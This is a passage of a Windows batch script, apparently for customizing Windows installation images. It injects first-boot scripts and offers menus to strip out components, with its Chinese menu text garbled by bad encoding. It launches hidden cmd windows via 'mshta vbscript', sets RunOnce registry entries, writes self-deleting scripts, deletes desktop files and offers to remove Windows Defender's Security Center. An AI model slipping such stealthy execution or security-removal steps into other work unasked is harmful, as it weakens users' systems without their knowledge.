	echo.   ^|                                                                        ^|
	echo.   ^|   ѡ��[2]:�������е�install.wim׷��ӳ���⽫�������һӳ��          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] ���ɵ�һӳ��  �����С��                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] ���ɶ��һӳ�������                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:12X /n /m ^>^>^>^>^>^>^>������ѡ��: 
	if errorlevel 3 goto :begin
	if errorlevel 2 goto :SaveImageNext
	if errorlevel 1 goto :Reninstall
)
:Reninstall
if exist "NewImage\install.wim" ren "NewImage\install.wim" "install_!date:~0,4!-!date:~5,2!-!date:~8,2!-!time:~0,2!-!time:~3,2!.wim"
:SaveImageNext
cls&echo.&echo.����׼�������У����Ե�...
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName"') do (set "Version=%%i")
if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
if /i "!Version:~0,1!"=="8" set "Version=10"
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" -o"Mount" "-xr^!MSVBCRT*" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\VC\MSVBCRT_x!Bit!.7z" "Windows\System32\MSVBCRT!Version!" -o"Mount" >nul 2>nul
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallMSVBCRT" /t REG_SZ /d "cmd.exe /c regedit /s \"!windir!\System32\MSVBCRT!Version!\" && del /f /q \"!windir!\System32\MSVBCRT!Version!\"" /f >nul 2>nul

if not exist "Mount\Windows\System32\Recovery\cmdpe.wim" rd /s /q "Mount\Windows\System32\Recovery" >nul 2>nul

set "SetupComplete="
set "Firstrun="
set "RunOnce="
set "SetupComplete=Mount\Windows\Setup\Scripts\SetupComplete.cmd"
set "Firstrun=Mount\Windows\Sysprep\FirstRun.cmd"
set "RunOnce=Mount\Windows\Sysprep\RunOnce.cmd"

md "Mount\Windows\Setup\Scripts" >nul 2>nul
md "Mount\Windows\Sysprep" >nul 2>nul
echo @echo off^&setlocal EnableDelayedExpansion > "!SetupComplete!"
if exist "!ScriptsLog!\password.log" type "!ScriptsLog!\password.log" >> "!SetupComplete!"
echo label %%SystemDrive%% Windows!Version! >> "!SetupComplete!"
echo bcdedit /timeout 3 >> "!SetupComplete!"
echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "RunOnce" /t REG_SZ /d "mshta vbscript:createobject(\"wscript.shell\").run(\"%%windir%%\Sysprep\RunOnce.cmd\",0)(window.close)" /f >> "!SetupComplete!"

if exist "!ScriptsLog!\Edge.log" type "!ScriptsLog!\Edge.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\activation.log" type "!ScriptsLog!\activation.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\CompactOS.log" type "!ScriptsLog!\CompactOS.log" >> "!SetupComplete!"
echo echo HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce [2 8 19]^>"%%~dp0LocRunOnce.ini" >> "!SetupComplete!"
echo echo HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce [1 7 17]^>"%%~dp0RecoveryRunOnce.ini" >> "!SetupComplete!"
echo regini "%%~dp0LocRunOnce.ini" >> "!SetupComplete!"
if exist "!ScriptsLog!\USB.log" type "!ScriptsLog!\USB.log" >> "!SetupComplete!"
echo wmic csproduct get Name /value^|findstr /i "MacBook iMac Macmini MacPro" ^&^& goto :Next >> "!SetupComplete!"
if exist "!ScriptsLog!\DrvCeonwOut.log" type "!ScriptsLog!\DrvCeonwOut.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\EasyDrvOut.log" type "!ScriptsLog!\EasyDrvOut.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\DrvCeonwIn.log" type "!ScriptsLog!\DrvCeonwIn.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\EasyDrvIn.log" type "!ScriptsLog!\EasyDrvIn.log" >> "!SetupComplete!"
echo :Next >> "!SetupComplete!"
if exist "!ScriptsLog!\App" FOR %%i in ("!ScriptsLog!\App\*.log") do (type "%%i" >> "!SetupComplete!")
echo regini "%%~dp0RecoveryRunOnce.ini" >> "!SetupComplete!"
echo wmic csproduct get Name /value^|findstr /i "MacBook iMac Macmini MacPro" ^|^| goto :Clear >> "!SetupComplete!"
echo :Mac >> "!SetupComplete!"
if exist "!ScriptsLog!\StartBootCamp.log" type "!ScriptsLog!\StartBootCamp.log" >> "!SetupComplete!"
echo :Clear >> "!SetupComplete!"
echo del /f /q /ar "!PUBLIC!\Desktop\*.*" >> "!SetupComplete!"
echo del /f /q /ar "!SystemDrive!\Users\Default\Desktop\*.*" >> "!SetupComplete!"
echo SHUTDOWN /R /T 0 >> "!SetupComplete!"
echo ping -n 999 127.0.0.1^>nul >> "!SetupComplete!"

if exist "!ScriptsLog!\Wallpaper.log" type "!ScriptsLog!\Wallpaper.log" >> "!SetupComplete!"

echo @echo off^&setlocal EnableDelayedExpansion > "!RunOnce!"
echo bcdedit /timeout 3 >> "!RunOnce!"
echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "FirstRun" /t REG_SZ /d "mshta vbscript:createobject(\"wscript.shell\").run(\"%%windir%%\Sysprep\FirstRun.cmd\",0)(window.close)" /f >> "!RunOnce!"
echo if exist "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat" call "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat"^&rd /s /q "%%ProgramFiles%%\SysCeo" >> "!RunOnce!"
if exist "!ScriptsLog!\AppAfter.log" type "!ScriptsLog!\AppAfter.log" >> "!RunOnce!"
echo rd /s /q %%windir%%\Setup\Scripts >> "!RunOnce!"
if exist "!ScriptsLog!\Autoclean.log" type "!ScriptsLog!\Autoclean.log" >> "!RunOnce!"
if exist "!ScriptsLog!\Wallpaper.log" type "!ScriptsLog!\Wallpaper.log" >> "!RunOnce!"
echo del /f /q %%0 >> "!RunOnce!"

echo @echo off^&setlocal EnableDelayedExpansion > "!Firstrun!"
echo bcdedit /timeout 3 >> "!Firstrun!"
:: echo md "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu" >> "!Firstrun!"
:: echo echo y^|cacls "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" /t /p everyone:n >> "!Firstrun!"
:: echo echo y^|cacls "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu" /t /p everyone:n >> "!Firstrun!"
:: echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "TaskBar" /t REG_SZ /d "cmd.exe /c echo y|cacls \"%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\" /t /p everyone:f" /f >> "!Firstrun!"
:: echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "StartMenu" /t REG_SZ /d "cmd.exe /c echo y|cacls \"%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu\" /t /p everyone:f" /f >> "!Firstrun!"
if exist "!Sysprep!\Windows Explorer.lnk" echo copy /v /y "%%windir%%\Sysprep\Windows Explorer.lnk" "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" ^&^& del /q "%%windir%%\Sysprep\Windows Explorer.lnk" >> "!Firstrun!"
echo del /f /q /ar "%%PUBLIC%%\Desktop\*.*" >> "!Firstrun!"
echo del /f /q /ar "%%USERPROFILE%%\Desktop\*.*" >> "!Firstrun!"
if exist "!ScriptsLog!\IeHome.log" type "!ScriptsLog!\IeHome.log" >> "!Firstrun!"
if exist "!ScriptsLog!\Update.log" type "!ScriptsLog!\Update.log" >> "!Firstrun!"
if exist "!ScriptsLog!\Serving.log" type "!ScriptsLog!\Serving.log" >> "!Firstrun!"
echo wmic csproduct get Name /value^|findstr /i "MacBook iMac Macmini MacPro" ^&^& goto :Mac >> "!Firstrun!"
if exist "Mount\Windows\BootCamp.cmd" echo del /f /q %%windir%%\BootCamp.cmd >> "!Firstrun!"
if exist "Mount\Windows\Apple.cmd" echo del /f /q %%windir%%\Apple.cmd >> "!Firstrun!"
if exist "Mount\Windows\DrvCeo.cmd" echo mshta vbscript:CreateObject^("WScript.Shell"^).Run^("cmd /c %%windir%%\DrvCeo.cmd",0^)^(window.close^) >>"!Firstrun!"
echo goto :clear >> "!Firstrun!"
echo :Mac >> "!Firstrun!"
if exist "Mount\Windows\DrvCeo.cmd" echo del /f /q %%windir%%\DrvCeo.cmd >> "!Firstrun!"
echo if exist "%%Windir%%\BootCamp.cmd" call "%%Windir%%\BootCamp.cmd"^&^&del /f /q "%%Windir%%\BootCamp.cmd" >> "!Firstrun!"
if exist "Mount\Windows\Apple.cmd" echo mshta vbscript:CreateObject^("WScript.Shell"^).Run^("cmd /c %%windir%%\Apple.cmd",0^)^(window.close^) >> "!Firstrun!"
echo :clear >> "!Firstrun!"
if exist "!ScriptsLog!\Autoclean.log" type "!ScriptsLog!\Autoclean.log" >> "!Firstrun!"
echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "clean1" /t REG_SZ /d "cmd.exe /c rd /s /q %%windir%%\Sysprep & rd /s /q %%windir%%\Driver & del /f /q %%windir%%\Apple.cmd & del /f /q %%windir%%\DrvCeo.cmd" /f >> "!Firstrun!"
echo del /f /q %%0^&exit >> "!Firstrun!"
REM for /f "tokens=4 delims= " %%i in ('Dism.exe /English /Get-MountedImageInfo:"Mount" ^| find /i "Image Index : "') do (set "index=%%i")
cls && echo. && echo.���ڱ��沢ж��ӳ���У����Ե�...
if exist "!ScriptsLog!" rd /s /q "!ScriptsLog!" >nul 2>nul
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
taskkill /f /IM explorer.exe >nul 2>nul && start "" explorer.exe
"!Dism!" /unmount-image /mountdir:"Mount" /commit
REM "!Dism!" /Cleanup-Mountpoints
rd /s /q "Mount" >nul 2>nul
if not exist "NewImage" md "NewImage" >nul 2>nul
cls&echo.&echo.�����Ż��������µ�ӳ�����Ե�...
"!Dism!" /Export-Image /SourceImageFile:"Image\install.wim" /SourceIndex:1 /DestinationImageFile:"NewImage\install.wim" /Compress:max
rd /s /q "!ScriptsLog!" >nul 2>nul
rd /s /q "Image" >nul 2>nul
cls && echo. && echo.��ӳ�񵼳���ɣ��ļ�λ��[NewImage]�ļ����ڣ�����Ϊinstall.wim�� && echo. && echo.�밴���������... && pause>nul
start "" explorer.exe "NewImage"
goto :begin

:RemoveMenu
reg query HKLM\ZTM >nul 2>nul||reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
start /b "" "!ToolsPath!\NSudo.exe" -U:T -P:E -CurrentDirectory:!-! "File\Bin\x64\Remove.cmd" !+! !ToolsPath!
goto :menu2



if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName" 2^>nul') do set "Version=%%i"
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "CurrentBuild" 2^>nul') do set "ImageBuild=%%i"
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "EditionID" 2^>nul') do set "ImageFlag=%%i"
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId" 2^>nul') do set "ReleaseId=%%i"
echo !ReleaseId!|Findstr /i "1809 1903 1909 2004" >nul 2>nul||(cls&echo.&echo.������Ŀǰ��������Windows10 1809/1903/1909/2004����ǰ���ص���Windows!Version!...&echo.&echo.�밴���������...&pause>nul&goto :menu2)
cls&mode con cols=80 lines=30&title ����˵�
set "goto="
set "Item="
set "Component="
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    _______________________________ ����˵� _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] �� ý ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] ��˽���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] ϵͳ���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] Զ�̿���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [5] ϵͳӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [6] WindowsӦ��                                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:123456X /n /m ">>>>>>>������ѡ��:" 
	if !errorlevel!==7 goto :menu2
	if !errorlevel!==6 goto :RemoveWindowsAppsMenu
	if !errorlevel!==5 goto :RemoveSystemAppsMenu
	if !errorlevel!==4 goto :RemoveRemotingMenu
	if !errorlevel!==3 goto :RemoveSystemMenu
	if !errorlevel!==2 goto :RemovePrivacyMenu
	if !errorlevel!==1 goto :RemoveMultimediaMenu
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    _______________________________ ����˵� _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] �� ý ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] ��˽���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] ϵͳ���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] Զ�̿���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [5] ϵͳӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [6] WindowsӦ��                                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:123456X /n /m ">>>>>>>������ѡ��:" 
	if !errorlevel!==7 goto :menu2
	if !errorlevel!==6 goto :RemoveWindowsAppsMenu
	if !errorlevel!==5 goto :RemoveSystemAppsMenu
	if !errorlevel!==4 goto :RemoveRemotingMenu
	if !errorlevel!==3 goto :RemoveSystemMenu
	if !errorlevel!==2 goto :RemovePrivacyMenu
	if !errorlevel!==1 goto :RemoveMultimediaMenu
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    _______________________________ ����˵� _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] �� ý ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] ��˽���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] ϵͳ���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] Զ�̿���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [5] ϵͳӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [6] WindowsӦ��                                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:123456X /n /m ">>>>>>>������ѡ��:" 
	if !errorlevel!==7 goto :menu2
	if !errorlevel!==6 goto :RemoveWindowsAppsMenu
	if !errorlevel!==5 goto :RemoveSystemAppsMenu
	if !errorlevel!==4 goto :RemoveRemotingMenu
	if !errorlevel!==3 goto :RemoveSystemMenu
	if !errorlevel!==2 goto :RemovePrivacyMenu
	if !errorlevel!==1 goto :RemoveMultimediaMenu
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" (
	echo.        
	echo.    _______________________________ ����˵� _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] ϵͳ���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] Զ�̿���                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] ϵͳӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] Windows Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:1234X /n /m ">>>>>>>������ѡ��:" 
	if !errorlevel!==5 goto :menu2
	if !errorlevel!==4 goto :RemoveMultimediaMenu
	if !errorlevel!==3 goto :RemoveSystemAppsMenu
	if !errorlevel!==2 goto :RemoveRemotingMenu
	if !errorlevel!==1 goto :RemoveSystemMenu
)

:RemoveMultimediaMenu
cls&mode con cols=80 lines=30&title �����ý�����
set "goto=:RemoveMultimediaMenu"
echo.        
echo.    ______________________________ ��ý����� ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] Adobe Flash                                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] �״ε�¼����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] ��Ϸ����� ^| ��Ҫ Microsoft ��Ϸ                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] ��ͼ����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] ����ʶ�� ^| ��Ҫ Cortana                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] Windows Media Player                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] Windows ��Ƭ�鿴��                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] Windows ϵͳ�������� ^| ��Ҫ Microsoft ��Ϸ                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] �Ƴ�����ȫ�����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:ABCDEFGHIX /N /M ">>>>>>>������ѡ��:"
if !errorlevel!==10 goto :RemoveMenu
if !errorlevel!==9 set "Component=MultimediaComponents"
if !errorlevel!==8 set "Component=WinSAT"
if !errorlevel!==7 set "Component=WindowsPhotoViewer"
if !errorlevel!==6 set "Component=WindowsMediaPlayer"
if !errorlevel!==5 set "Component=SpeechRecognition"
if !errorlevel!==4 set "Component=SnippingTool"
if !errorlevel!==3 set "Component=GameExplorer"
if !errorlevel!==2 set "Component=FirstLogonAnimation"
if !errorlevel!==1 set "Component=AdobeFlashForWindows"
goto :RemoveWindowsComponents

:RemovePrivacyMenu
cls&mode con cols=80 lines=36&title ������˽���
set "goto=:RemovePrivacyMenu"
echo.        
echo.    _______________________________ ��˽��� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] ����ķ���Ȩ��                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] �ͻ�������Ƽƻ� ^(CEIP^)                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] ����ʶ��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] �ں˵��� ^| �����ڣ�Windows ���󱨸�                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] ��λ����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] ͼƬ����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] Pin ��¼֧��                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] ͳһң��ͻ��� ^(Asimov^) ^| �����ڣ�Windows ���󱨸�               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] WiFi Network Manager ^(WiFi ��֪^)                                 ^|
echo.   ^|                                                                        ^|
if "!ImageBuild!" equ "17763" (
echo.   ^|   [J] Windows ���󱨸�                                                 ^|
echo.   ^|                                                                        ^|
)
if "!ImageBuild!" neq "17763" (
echo.   ^|   [J] Windows ���󱨸� ^| ��Ҫȫ������Ӧ�ó���                          ^|
echo.   ^|                                                                        ^|	
)
echo.   ^|   [K] Windows ��Ա����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [L] �Ƴ�����ȫ�����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:ABCDEFGHIJKLX /N /M ">>>>>>>������ѡ��:"
if !errorlevel!==13 goto :RemoveMenu
if !errorlevel!==12 set "Component=PrivacyComponents"
if !errorlevel!==11 set "Component=WindowsInsiderHub"
if !errorlevel!==10 set "Component=WindowsErrorReporting"
if !errorlevel!==9  set "Component=WiFiNetworkManager"
if !errorlevel!==8  set "Component=UnifiedTelemetryClient"
if !errorlevel!==7  set "Component=PinEnrollment"
if !errorlevel!==6  set "Component=PicturePassword"
if !errorlevel!==5  set "Component=LocationService"
if !errorlevel!==4  set "Component=KernelDebugging"
if !errorlevel!==3  set "Component=FaceRecognition"
if !errorlevel!==2  set "Component=CEIP_SQM"
if !errorlevel!==1  set "Component=AssignedAccess"
goto :RemoveWindowsComponents

:RemoveRemotingMenu
cls&mode con cols=80 lines=30&title ����Զ�����
set "goto=:RemoveRemotingMenu"
echo.        
echo.    _______________________________ Զ����� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ��ͥ��                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] MultiPoint Connector                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] Զ��Э��                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] �Ƴ�����ȫ�����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:1234X /N /M ">>>>>>>������ѡ��:"
if !errorlevel!==5 goto :RemoveMenu
if !errorlevel!==4 set "Component=RemotingComponents"
if !errorlevel!==3 set "Component=RemoteAssistance"
if !errorlevel!==2 set "Component=MultiPointConnector"
if !errorlevel!==1 set "Component=HomeGroup"
goto :RemoveWindowsComponents

:RemoveSystemMenu
cls&mode con cols=80 lines=40&title ����ϵͳ���
set "goto=:RemoveSystemMenu"
echo.        
echo.    _______________________________ ϵͳ��� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] �豸���� ^(Ƕ��ʽ����^)                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] ���ɷ�������                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] ���ɴ���                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] �ļ���ʷ��¼                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] �ֶ���װ���� ^(�͵�����^)                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] ��ͼ����                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] ��ȫ���� ^| �����ڣ�Windows Defender                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] �����¼��                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] ϵͳ�ָ�                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [J] Windows ����                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [K] ������ Linux �� Windows ��ϵͳ                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [L] Windows To Go                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [M] д�ְ�                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [N] �Ƴ�����ȫ�����                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:ABCDEFGHIJKLMNX /N /M ">>>>>>>������ѡ��:"
if !errorlevel!==15 goto :RemoveMenu
if !errorlevel!==14 set "Component=SystemComponents"
if !errorlevel!==13 set "Component=Wordpad"
if !errorlevel!==12 set "Component=WindowsToGo"
if !errorlevel!==11 set "Component=WindowsSubsystemForLinux"
if !errorlevel!==10 set "Component=WindowsBackup"
if !errorlevel!==9  set "Component=SystemRestore"
if !errorlevel!==8  set "Component=StepsRecorder"
if !errorlevel!==7  set "Component=SecurityCenter"
if !errorlevel!==6  set "Component=Paint"
if !errorlevel!==5  set "Component=ManualSetup"
if !errorlevel!==4  set "Component=FileHistory"
if !errorlevel!==3  set "Component=EasyTransfer"
if !errorlevel!==2  set "Component=EaseOfAccessThemes"
if !errorlevel!==1  set "Component=DeviceLockdown"
goto :RemoveWindowsComponents

:RemoveSystemAppsMenu
cls&mode con cols=80 lines=30&title ϵͳӦ��
set "goto="
echo.        
echo.    _______________________________ ϵͳӦ�� _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] ϵͳӦ��һ                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] ϵͳӦ�ö�                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ">>>>>>>������ѡ��:"
if !errorlevel!==3 goto :RemoveMenu
if !errorlevel!==2 goto :RemoveSystemAppsMenu2
if !errorlevel!==1 goto :RemoveSystemAppsMenu1

:RemoveSystemAppsMenu1
cls&mode con cols=80 lines=40&title ����ϵͳӦ��һ
set "goto=:RemoveSystemAppsMenu1"
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    ______________________________ ϵͳӦ��һ ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] ָ����������Ӧ�� ^| �����ڣ�����ķ���Ȩ��                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX ������                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ����ע��Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Content Delivery Manager ^| ��Ҫȫ������Ӧ�ó���                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Cortana����ʼ�˵�����������Ӧ�� ^| �����ڣ�����ʶ��               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Edge �����߹��߿ͻ���                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Ŀ�ӿ���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] �ļ���Դ������Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] ����Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ��ͼ�ؼ�                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps1"
	if !errorlevel!==12 set "Component=NarratorQuickStart"
	if !errorlevel!==11 set "Component=MapControl"
	if !errorlevel!==10 set "Component=LockApp"
	if !errorlevel!==9  set "Component=FileExplorer"
	if !errorlevel!==8  set "Component=ECApp"
	if !errorlevel!==7  set "Component=EdgeDevToolsClient"
	if !errorlevel!==6  set "Component=Cortana"
	if !errorlevel!==5  set "Component=ContentDeliveryManager"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    ______________________________ ϵͳӦ��һ ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] ָ����������Ӧ�� ^| �����ڣ�����ķ���Ȩ��                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX ������                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ����ע��Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Content Delivery Manager ^| ��Ҫȫ������Ӧ�ó���                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Cortana����ʼ�˵�����������Ӧ�� ^| �����ڣ�����ʶ��               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Edge �����߹��߿ͻ���                                            ^|
	echo.   ^|                                                                        ^|
